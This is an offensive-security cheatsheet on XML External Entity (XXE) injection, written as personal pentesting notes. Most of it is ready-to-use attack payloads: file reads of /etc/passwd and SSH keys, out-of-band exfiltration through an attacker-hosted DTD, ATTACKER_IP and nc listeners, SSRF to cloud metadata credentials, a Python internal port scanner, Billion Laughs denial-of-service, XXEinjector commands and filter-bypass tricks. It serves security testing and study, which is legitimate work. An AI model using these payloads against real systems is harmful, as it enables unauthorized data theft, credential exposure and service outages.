---
created: 2026-07-07
tags:
  - web_hacking
  - cheatsheet
status: substantial
---
## Attack surface

>[!important] XXE vulnerabilities only exist where XML reaches a parser.

- XML is heavily used in web services and APIs that need to exchange structured data:
	- **[SOAP (Simple Object Access Protocol)](https://en.wikipedia.org/wiki/SOAP)** uses XML to transport data.
	- **[REST (Representational State Transfer)](https://en.wikipedia.org/wiki/REST) APIs** may serialize data as XML (`Content-Type: application/xml` or `text/xml`).
	- **[RSS (RDF Site Summary or Really Simple Syndication)](https://en.wikipedia.org/wiki/RSS)** uses XML to distribute news feeds and blog updates.
	- **[XHTML (Extensible HyperText Markup Language)](https://en.wikipedia.org/wiki/XHTML)** is part of the family of XML markup languages that extends HTML.
	- **[SVG (Scalable Vector Graphics)](https://en.wikipedia.org/wiki/SVG)** is an XML-based vector image format widely used on the web.
	- **[AJAX (Asynchronous JavaScript and XML)](https://en.wikipedia.org/wiki/Ajax_(programming)** is one of the most common ways to exchange data asynchronously in web requests, and it often uses XML for data serialization.
	- **[XMPP (Extensible Messaging and Presence Protocol)](https://en.wikipedia.org/wiki/XMPP)** is an XML-based protocol for instant messaging.
	- **Configuration files** used by web servers (e.g., [Apache](https://en.wikipedia.org/wiki/Apache_HTTP_Server)), applications, and frameworks to store settings are often formatted as XML documents.

>[!tip]+ XML MIME types
> ```
> application/xml
> text/xml
> application/xml-external-parsed-entity
> text/xml-external-parsed-entity
> application/xml-dtd
> image/svg+xml
> ```

XML processing points include:

- **API and web application endpoints**:
	- REST APIs that use XML (`application/xml`, `text/xml`, etc.  ). 
	- SOAP APIs (often legacy systems).
	- [XML-RPC](https://en.wikipedia.org/wiki/XML-RPC) endpoints.
	- [SAML](https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language) authentication systems (SSO)
	- [RSS](https://en.wikipedia.org/wiki/RSS)/[Atom](https://en.wikipedia.org/wiki/Atom_(web_standard)) feed processors and aggregators.
	- API import/export features.
	- Configuration file uploads.

- **XML-based file formats**:
	- XML documents: `.xml`
	- Office documents:
		- Word: `.docx`, `.docm`
		- Excel: `.xlsx`, `.xlsm`
		- PowerPoint: `.pptx`, `.pptm`
	- Templates and ad-ins: `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam`, etc.
	- ODF (OpenDocument Format, used by LibreOffice and OpenOffice): `.odt`, `.ods`, `.odp`.
	- Scalable Vector Graphics (SVG): `.svg`
	- XHTML documents: `.xhtml`
	- MathML: `.mathml`
	- 3D graphics: `.x3d`
	- Specialized formats: `.gpx` (GPS data), `.dae` (3D models), `.rss` (RSS), `.atom` (Atom), etc.
	- etc.

| Format                   | Extensions                                                    |
| ------------------------ | ------------------------------------------------------------- |
| Generic XML              | `.xml`                                                        |
| Microsoft Office (OOXML) | `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`          |
| Office templates/add-ins | `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam` |
| OpenDocument Format      | `.odt`, `.ods`, `.odp`                                        |
| Scalable Vector Graphics | `.svg`                                                        |
| XHTML                    | `.xhtml`                                                      |
| MathML                   | `.mathml`                                                     |
| 3D graphics              | `.x3d`, `.dae`                                                |
| GPS data                 | `.gpx`                                                        |
| Syndication              | `.rss`, `.atom`                                               |
> [!note]+ XML file extension list for fuzzing
> 
> ```
> .xml  
> .docs  
> .docm  
> .xlsx  
> .xlsm  
> .pptx  
> .pptm  
> .dotx  
> .dotm  
> .xltm  
> .potx  
> .potm  
> .ppam  
> .odt  
> .ods  
> .odp  
> .svg  
> .xhtml  
> .mathml  
> .x3d  
> .gpx  
> .dae  
> .rss  
> .atom
> ```

>[!note] See [[File upload]].

- Some less obvious XML processing paths:
	- Applications that *accept JSON* but *internally convert it to XML* before processing.
	- Web frameworks with middleware that transparently parses XML request bodies.
	- PDF generators that accept XML-formatted template input.
	- Database features: MySQL `LOAD XML`, PostgreSQL XML parsing functions.
	- Java and .NET functions that deserialize XML-encoded objects.
	- Some applications accept XML in URL parameters, though this is less common.

>[!tip]+ Some applications support **multiple formats**. Sometimes, changing `Content-Type` to `application/xml` may cause the application to switch parsers.

> [!note] OOXML formats (`.docx`, `.xlsx`, etc.) are ZIP archives that *contain* XML files. If the server extracts and parses these server-side — for document preview, conversion, or indexing — each embedded XML file is a potential XXE injection point.

> [!important]+ XML MIME types
> - `application/xml` — Standard XML.
> - `text/xml` — Legacy XML content type.
> - `application/soap+xml` — SOAP web services.
> - `application/xhtml+xml` — XHTML documents.
> - `image/svg+xml` — SVG graphics.
> - `application/rss+xml` — RSS feeds.
> - `application/atom+xml` — Atom feeds.
> -  `application/xml-external-parsed-entity` (`text/xml-external-parsed-entity` is an alias).
> - `application/xml-dtd` (for DTDs).
> 
> ```
> application/xml    
> text/xml    
> application/soap+xml    
> application/xhtml+xml    
> image/svg+xml    
> application/rss+xml    
> application/atom+xml
> ```
> 

- Indicators of XML processing:
	- Responses formatted as XML (start with `<?xml` or contain XML tags).
	- Error messages referencing XML parsing — these may expose parser type, version, and configuration.
	- Responses that reflect submitted input back in an XML-structured body.
	- SOAP faults or XML validation errors in response to malformed input.

 >[!tip]+ Use fuzzing to detect and confirm XXE injection
>- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
>- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)

## Confirming entity expansion

- Use an **internal entity** to confirm expansion: 

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe "XXE-CANARY">
]>
<root>
  <field>&xxe;</field>
</root>
```

- If `XXE-CANARY` appears in the response, the parser expands entities — proceed to external entities.

## In-band file read (LFI)

- Test for external entity expansion against a local file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <field>&xxe;</field>
</root>
```

- For initial test probes, it's best to choose files with no newlines and special characters, such as `/etc/hostname`.

>[!tip]+ To bypass filters, try using `PUBLIC` instead of `SYSTEM`.

- Attempt to read a file with newlines or special characters:

```xml
<!ENTITY ext SYSTEM "file:///etc/passwd">
```

 >[!tip]+ Use fuzzing to detect and confirm XXE injection
>- [`SecLists/Fuzzing/XXE-Fuzzing.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt)
>- [`payloadbox/xxe-injection-payload-list`](https://github.com/payloadbox/xxe-injection-payload-list?tab=readme-ov-file)
### Handling special characters — CDATA or PHP filter

- Files containing characters that have special meaning in XML (e.g., `<`, `>`, `&`) break direct substitution. 
- Two possible solutions:
	- **`php://filter` with Base64 encoding** (PHP targets only) 
	- **CDATA wrapping via an externally-hosted DTD**
#### `php://filter` with Base64 encoding

- The `php://filter` wrapper applies a transformation to the input stream, and can be used to Base64-encode file content before it reaches the XML parser (`convert.base64-encode`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>
  <data>&file;</data>
</root>
```

- The response will contain a Base64 string. Decode it locally:

```bash
echo -n "BASE64STRING" | base64 -d
```

>[!note] This method only works on PHP servers with `php://` enabled.
#### CDATA wrapping via an externally-hosted DTD

- Host a DTD on your HTTP server:

```xml
<!-- xxe.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY joined "%start;%file;%end;">
```

- Inject a DTD that references the DTD you serve:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>
  <data>&joined;</data>
</root>
```

### File read via error messages

- Deliberately reference a non-existent path that _embeds_ the target file's contents, and let the parser's own error message leak it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
	%eval;
	%exfil;
]>
<root><field>trigger</field></root>
```

 >[!note] This works best against Java-based parsers which produce verbose, path-inclusive exceptions. Good fallback when OOB connections are blocked.

- Bypass via externally-hosted DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfil;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
	<!ENTITY % xxe SYSTEM "DTD_URL"> %xxe;
]>
<root><field>trigger</field></root>
```
### Files worth checking

- Once you confirm LFI check which files you can access:

	- `/etc/passwd`: User accounts, UID/GID mapping.
	- `/etc/hosts`: Internal network names.
	- `/etc/hostname`: Hostname (no newlines; safe for XML).
	- `/proc/self/environ`: Process environment variables (may contain secrets, paths).
	- `/proc/self/cmdline`: Command line of the current process.
	- `/proc/net/tcp`: Active TCP connections.
	- `/proc/net/fib_trie`: Routing table.
	- `/var/log/apache2/access.log`: Apache access logs.
	- `/var/www/html/config.php`: PHP application configuration (database credentials).
	- `/home/<user>/.ssh/id_rsa`: SSH private keys.
	- `/root/.ssh/id_rsa`: Root SSH private key.
	- `~/.aws/credentials`: AWS access keys.
	- `/etc/shadow`: Password hashes (requires root-level process).
	- `/root/.bash_history`: Command history (requires root-level process).


```powershell
/etc/passwd
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp
/proc/net/fib_trie
/var/log/apache2/access.log
/var/www/html/config.php
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
~/.aws/credentials
/etc/shadow
/root/.bash_history
```

- On Windows:
	
	- `C:\Windows\System32\drivers\etc\hosts` — Internal network names.
	- `C:\inetpub\wwwroot\web.config` — IIS server configuration file (XML).
	- `C:\Windows\win.ini` — Legacy windows configuration file.
	- `C:\Users\<user>\.ssh\id_rsa` — SSH private keys.

```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\win.ini
C:\Users\<user>\.ssh\id_rsa
```

>[!tip] Fuzz files using LFI wordlists
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
> - [`seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt)
> - [`seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt) (Windows)

## Blind XXE injection via OOB interaction

- When the application does **not** reflect entity content in the response, use OOB techniques to confirm the vulnerability and extract data.
### Confirming vulnerability using DNS queries

- Confirm XXE injection vulnerability via DNS callback to your controlled domain:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://<collaborator_id>.oastify.com">
]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

- If the parser restricts general entities, try **parameter entities** (`%`) instead:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
	<!ENTITY % xxe SYSTEM "http://<collaborator_id>.oastify.com"> 
	%xxe; 
]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
### Extracting file contents via OOB HTTP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25;oob SYSTEM 'http://<collaborator_id>.oastify.com/?data=%file;'>">
  %eval;
  %oob;
]>
<root><field>trigger</field></root>
```
#### Newlines

- Files with newlines may cause the URL to break. 
- Two possible solutions:
	- **`php://filter` with Base64 encoding**
	- **FTP instead of HTTP**

- If these don't work, target single-line files as a fallback.
##### `php://filter` with Base64 encoding

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25;oob SYSTEM 'http://<collaborator_id>.oastify.com/?data=%file;'>">
  %eval;
  %oob;
]>
<root><field>trigger</field></root>
```

- Decoding listener:

```php
<?php
if (isset($_GET['data'])) {
    error_log("\n\n" . base64_decode($_GET['data']));
}
?>
```

```bash
php -S 0.0.0.0:8000
```
##### FTP instead of HTTP

- FTP doesn't have HTTP's URL newline restrictions. Some parsers support `ftp://`:

```xml
<!ENTITY % oob SYSTEM "ftp://<attacker_ip_address>:21/?data=%file;">
```

- You will need an FTP listener to capture the connection:

```bash
nc -lvnp 21
```
### OOB via external DTD

- Some parsers reject nested parameter entity declarations inside the **internal** DTD subset. Host an **external** DTD on your server instead:

```xml
<!-- xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://<collaborator_id>.oastify.com?data=%file;'>">
```

- Reference your DTD in the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://<attacker_ip_address>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
  <field>&exfil;</field>
</root>
```

## SSRF via XXE

>[!note] See [[SSRF]].

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>
  <field>&ssrf;</field>
</root>
```

- Valuable internal targets to check:

| Target                                                              | Purpose                                                  |
| ------------------------------------------------------------------- | -------------------------------------------------------- |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Cloud (AWS) instance credentials                         |
| `http://localhost/server-status`                                    | Apache status                                            |
| `http://localhost:8080/manager/html`                                | Tomcat Manager                                           |
| `http://127.0.0.1:9200/`                                            | Elasticsearch                                            |
| `http://127.0.0.1:6379/`                                            | Redis (protocol mismatch may still confirm reachability) |
| `http://127.0.0.1:2375/`                                            | Docker daemon API                                        |

- Check if you can cause requests to arbitrary external domains:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://<collaborator_id>.oastify.com">
]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
### Blind internal port scanning

- Even if the application doesn't give any explicit output, response timing and content differences between open, closed, and filtered ports may allow blind port scanning of internal hosts:

```python
import requests
import time

target = "https://example.com/api/xml"
internal_ip = "192.168.1.100"
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]

for port in ports:
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{internal_ip}:{port}/">
]>
<root>&xxe;</root>'''

    try:
        t0 = time.time()
        resp = requests.post(target, data=payload, timeout=10,
                             headers={"Content-Type": "application/xml"})
        elapsed = time.time() - t0

        body = resp.text.lower()
        if "connection refused" in body:
            status = "CLOSED"
        elif elapsed > 8:
            status = "FILTERED (timeout)"
        else:
            status = f"OPEN ({elapsed:.2f}s)"

        print(f"[{port}] {status}")

    except requests.Timeout:
        print(f"[{port}] FILTERED (timeout)")
    except Exception as e:
        print(f"[{port}] ERROR: {e}")
```

 - Open ports typically return quickly with some application-level content or a service-specific error; 
 - Closed ports return `Connection refused` almost instantly; 
 - Filtered ports time out. 
 - The pattern is parser-dependent; Java parsers tend to give the most informative errors here.
## XXE via file upload

- **SVG** is valid XML commonly processed server-side:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>
```

- **OOXML (`.docx`/`.xlsx`/`.pptx`)** are ZIP archives of XML parts. If they are parsed and processed by the application, inject your `DOCTYPE` into an internal part (such as `docProps/core.xml` or `word/document.xml`), the zip again and upload. 

>[!note] This only works if the _server-side_ processor parses the XML with entity resolution enabled — desktop Word/Excel/PowerPoint will not process attacker-controlled DTDs on open.

- You may find XXE injection possibilities in different file formats:

| Format                   | Extensions                                                    |
| ------------------------ | ------------------------------------------------------------- |
| Generic XML              | `.xml`                                                        |
| Microsoft Office (OOXML) | `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`          |
| Office templates/add-ins | `.dotx`, `.dotm`, `.xltx`, `.xltm`, `.potx`, `.potm`, `.ppam` |
| OpenDocument Format      | `.odt`, `.ods`, `.odp`                                        |
| Scalable Vector Graphics | `.svg`                                                        |
| XHTML                    | `.xhtml`                                                      |
| MathML                   | `.mathml`                                                     |
| 3D graphics              | `.x3d`, `.dae`                                                |
| GPS data                 | `.gpx`                                                        |
| Syndication              | `.rss`, `.atom`                                               |

> [!note]- XML file extension list for fuzzing
> 
> ```
> .xml  
> .docs  
> .docm  
> .xlsx  
> .xlsm  
> .pptx  
> .pptm  
> .dotx  
> .dotm  
> .xltm  
> .potx  
> .potm  
> .ppam  
> .odt  
> .ods  
> .odp  
> .svg  
> .xhtml  
> .mathml  
> .x3d  
> .gpx  
> .dae  
> .rss  
> .atom
> ```

>[!note] See [[File upload]].

## XInclude injection

>**XInclude** (`<xi:include>`) is a W3C specification (`http://www.w3.org/2001/XInclude`) that allows an XML document to assemble itself from sub-documents. 

- If the parser supports XInclude and untrusted input reaches it, this achieves XXE-equivalent **without a `DOCTYPE`**.

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

- `parse="text"` includes the resource as raw character data. Omit it and the processor tries to parse the file as XML (usually fails on non-XML files).

>[!important] `XInclude` attacks do not require injecting a `DOCTYPE` declaration.

- External interaction:

```xml
<osc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://q6x7lj7b4ce6nsly1mvkui3ah1nubkzlncdz3ns.oastify.com/foo"/></osc>
```

```
productId=1&storeId=%3cosc%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fq6x7lj7b4ce6nsly1mvkui3ah1nubkzlncdz3ns.oastify.com%2ffoo%22%2f%3e%3c%2fosc%3e
```


- Extract files:

```xml
<xxe xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></xxe>
```

```
productId=%3cxxe%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2fxxe%3e&storeId=1
```
## XSLT-based XXE

>**[XSLT (Extensible Stylesheet Language Transformations)](https://en.wikipedia.org/wiki/XSLT)** is an XML-based language for transforming XML documents.

- If an application accepts a user-supplied XSLT stylesheet and applies it server-side, this can be exploited in XXE-injection-style attacks:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

- Or via `xsl:import`:

```xml
<xsl:import href="file:///etc/passwd"/>
```

## Denial of Service via XXE

### The Billion Laughs attack

```XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
### Quadratic blowup

- Less dramatic but more reliable against parsers with depth limits on recursive expansion.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<bomb>
&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
  <!-- repeat hundreds more times -->
</bomb>
```
### Infinite stream

 - **Infinite stream** references an infinite or extremely large system resource:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dos [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<dos>&xxe;</dos>
```

- On Unix, `/dev/random` generates an endless stream of random bytes. The parser reads indefinitely, consuming file descriptors and memory until the process is killed or the system runs out of resources. `/dev/urandom` produces the same result.

## Automated XXE exploitation with `XXEinjector`

- For complex OOB scenarios, manual payload construction becomes tedious. 
- [`XXEinjector`](https://github.com/enjoiz/XXEinjector) automates OOB XXE exploitation and file enumeration.


>[!note]+ Installation
> ```bash
> git clone https://github.com/enjoiz/XXEinjector.git
> cd XXEinjector
> ```

- Basic file enumeration using OOB via HTTP:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=http
```

- Enumerate all files in a directory:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/ --oob=http --enumerate
```

- Use FTP for OOB:

```bash
ruby XXEinjector.rb --host=ATTACKER_IP --ftpport=21 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=ftp
```

- The `request.txt` file is a raw HTTP request with `XXEINJECT` as a placeholder in the XML body where `XXEinjector` will inject its payload. Capture the request from Burp, replace the XML content field value with `XXEINJECT`, and save it.

## Filter and WAF bypass techniques

| Filter behavior                                                                  | Bypass                                                                                                                                                                                                                                                                                             |
| -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Blocks `SYSTEM` keyword                                                          | Try `PUBLIC "..." "http://..."` — some filters only match `SYSTEM`.                                                                                                                                                                                                                                |
| Strips `<!DOCTYPE ...>` entirely                                                 | Use [[#XInclude injection]] — no `DOCTYPE` required.                                                                                                                                                                                                                                               |
| Blocks general entity declarations (`<!ENTITY name SYSTEM ...>`)                 | Use **parameter entities** (`% name`) — different namespace, frequently unfiltered.                                                                                                                                                                                                                |
| Inspects/blocks inline DTD content for suspicious keywords (`file://`, `SYSTEM`) | Move the payload to an **externally hosted DTD** ([[#OOB via external DTD]]) — the filter only sees a URL to your DTD, not the sensitive keywords themselves.                                                                                                                                      |
| Filters based on `Content-Type: application/xml` only                            | Try alternate XML MIME types the parser may still accept (`text/xml`, `application/soap+xml`) — see [[#Attack surface]].                                                                                                                                                                           |
| Legacy .NET apps using content-based encoding auto-detection                     | Historically, **UTF-7 encoded** XML declarations (`<?xml version="1.0" encoding="UTF-7"?>` with UTF-7-encoded payload bytes) bypassed ASCII-keyword filters looking for `SYSTEM`/`ENTITY` in older .NET/IIS stacks. Largely patched in modern frameworks but worth testing against legacy targets. |
| Denies outbound network entirely                                                 | Fall back to [[#Error-based exfiltration]].                                                                                                                                                                                                                                                        |